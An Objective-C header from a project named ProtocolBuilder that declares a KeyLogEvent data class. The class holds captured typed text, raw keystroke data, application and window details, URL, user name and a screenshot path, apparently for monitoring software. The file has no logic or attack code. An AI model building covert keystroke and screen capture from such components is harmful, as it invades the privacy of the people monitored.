//
//  KeyLogEvent.h
//  ProtocolBuilder
//
//  Created by Benjawan Tanarattanakorn on 9/4/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "Event.h"
#import "MediaTypeEnum.h"

@interface KeyLogEvent : Event {
	NSString	*mUserName;
    NSString    *mApplicationID;
	NSString	*mApplication;          // Application name
	NSString	*mTitle;
    NSString    *mUrl;
	NSString	*mActualDisplayData;
	NSString	*mRawData;
    MediaType   mScreenShotMediaType;
    NSString    *mScreenShot;           // Path to screen shot
}

@property (nonatomic, copy) NSString *mUserName;
@property (nonatomic, copy) NSString *mApplicationID;
@property (nonatomic, copy) NSString *mApplication;
@property (nonatomic, copy) NSString *mTitle;
@property (nonatomic, copy) NSString *mUrl;
@property (nonatomic, copy) NSString *mActualDisplayData;
@property (nonatomic, copy) NSString *mRawData;
@property (nonatomic, assign) MediaType mScreenShotMediaType;
@property (nonatomic, copy) NSString *mScreenShot;

@end
